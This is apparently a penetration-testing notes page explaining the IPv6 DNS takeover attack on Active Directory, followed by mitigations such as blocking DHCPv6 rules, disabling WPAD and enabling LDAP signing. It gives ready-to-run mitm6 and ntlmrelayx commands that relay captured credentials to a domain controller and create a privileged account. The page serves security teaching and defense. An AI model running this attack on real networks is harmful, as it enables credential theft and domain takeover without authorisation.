# IPv6 DNS Takeover

This attack takes advantage of machines utilizing IPv4 while still having IPv6 active in their network adapter properties. When a machine is configured in this way, one question comes to mind. Who is the DNS for IPv6? Most of the time, nobody.

With this misconfiguration, an attacker can listen for any incoming IPv6 traffic, declaring themselves as the DNS for IPv6. Through this process, an attacker can gain authentication to the Domain Controller with LDAP (Lightweight Directory Access Protocol) or SMB (Server Message Block).





## IPv6 DNS Takeover attack

For the installation of the tool follow this steps:

{% code title="mitm6 installation" overflow="wrap" %}
```bash
cd /opt
sudo git clone https://github.com/dirkjanm/mitm6
sudo pipx install .
```
{% endcode %}

{% code title="Kali installation cmd" %}
```bash
sudo apt install mitm6
```
{% endcode %}

### Setup and run Ntlmrelayx

Before starting `mitm6` , we have to configure and run the relay which will attempt to access the DC's LDAP service with the capted credentials.

{% code overflow="wrap" %}
```bash
impacket-ntlmrelayx -6 -t ldaps://DC_IP -wh FAKE.DOMAIN.local -l lootme

# -6: Listen on both IPv6 and IPv4
# -t: Target to relay the credentials to, can be an IP, hostname or URL like domain\username@host:port
# -l: Loot directory in which gathered loot such as SAM dumps will be storedbash (in our local machine)
# -wh: Enable serving a WPAD file for Proxy Authentication attack, setting the proxy host to the one supplied.
```
{% endcode %}

### Run mitm6 tool

Once we have started the relay, we can start the mitm6 tool which simulate a Fake IPv6 DNS.

```bash
sudo mitm6 -d DOMAIN
```



### Check the results

If the attack will successfull we would have our loot directory with all data.

<figure><img src="../../../.gitbook/assets/image (7) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>



### User creations

When a victim user login into his machine, the tool `mitm6` will try to create a user with more privilege.

For the information check the output of the tool when a user loggins.

<figure><img src="../../../.gitbook/assets/image (8) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>



## Mitigation

### Limits the IPv6 by rule

Disable IPv6 entirely may have unwanted side effects. Setting the following predefined rules to Block instead of Allow prevents the attack from working:

* (Inbound) Core Networking - **Dynamic Host Configuration Protocol for IPv6** (**DHCPV6-In**)
* (Inbound) Core Networking - **Router Advertisement** (**ICMPv6-In**)
* (Outbound) Core Networking - **Dynamic Host Configuration Protocol for IPv6** (**DHCPV6 - Out**)

### Disable WPAD

If WPAD is not in use internally, **disable it** via Group Policy and by disabling the **WinHttpAutoProxySvc service**

### Make LDAP secure by attack

Relaying to LDAP and LDAPS can only be mitigated by **enabling** both **LDAP signing** and LDAP **channel binding**.





